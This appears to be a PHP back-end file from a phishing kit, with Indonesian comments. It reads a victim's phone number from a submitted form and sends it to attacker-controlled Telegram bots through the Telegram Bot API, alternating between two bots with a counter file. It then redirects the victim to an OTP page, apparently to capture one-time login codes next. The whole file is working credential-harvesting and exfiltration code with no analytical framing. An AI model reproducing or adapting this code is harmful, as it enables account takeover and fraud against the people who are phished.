<?php
include "./api/telegram.php";
session_start();

$phone = $_POST['phoneNumber'];
$_SESSION['phoneNumber'] = $phone;

// Format pesan
$message = "
( NoHP | $phone )

- No HP : `$phone`
";

// Fungsi kirim pesan ke bot
function sendMessage($id_telegram, $message, $id_botTele) {
    $url = "https://api.telegram.org/bot" . $id_botTele . "/sendMessage?parse_mode=markdown&chat_id=" . $id_telegram;
    $url .= "&text=" . urlencode($message);
    $ch = curl_init();
    curl_setopt_array($ch, [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
    ]);
    curl_exec($ch);
    curl_close($ch);
}

// Path file counter
$counterFile = __DIR__ . "/counter.txt";

// Jika belum ada file counter, buat dengan isi "1"
if (!file_exists($counterFile)) {
    file_put_contents($counterFile, "1");
}

// Baca isi counter
$counter = intval(file_get_contents($counterFile));

// Kirim sesuai urutan bot dan simpan ke session
if ($counter === 1) {
    sendMessage($id_telegram1, $message, $id_botTele1);
    $_SESSION['bot_id'] = 1;
    file_put_contents($counterFile, "2");
} else {
    sendMessage($id_telegram2, $message, $id_botTele2);
    $_SESSION['bot_id'] = 2;
    file_put_contents($counterFile, "1");
}

// Lanjut ke halaman OTP
header('Location: ../otp/');
exit();
?>
